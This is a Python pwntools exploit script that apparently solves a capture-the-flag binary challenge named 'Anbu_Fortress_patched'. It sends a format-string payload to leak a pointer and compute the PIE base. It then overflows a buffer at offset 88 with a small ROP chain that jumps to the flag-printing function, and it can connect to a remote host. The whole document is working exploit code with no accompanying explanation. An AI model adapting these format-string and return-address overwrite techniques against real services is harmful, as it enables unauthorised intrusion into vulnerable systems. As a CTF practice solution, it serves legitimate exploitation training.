#!/usr/bin/env python3

from pwn import *

e = ELF("./Anbu_Fortress_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main
b check_key_and_print_flag
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    p.sendlineafter(b"identificador: ", b"%12$p")
    p.recvuntil(b"ero")

    piebase = int(p.recvline().strip(b"\n"), 16) - 0x5080
    info(hex(piebase))

    check_key_and_print_flag = piebase + 0x00001209
    ret = piebase + 0x0000000000001016
    offset = 88
    payload = flat({offset: [
            ret, # Align the stack
            check_key_and_print_flag 
        ]})
    p.sendlineafter(b"riesgo la seguridad de Konoha.", payload)
    p.sendlineafter(b"Introduce la clave:", b"deadbeef")
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

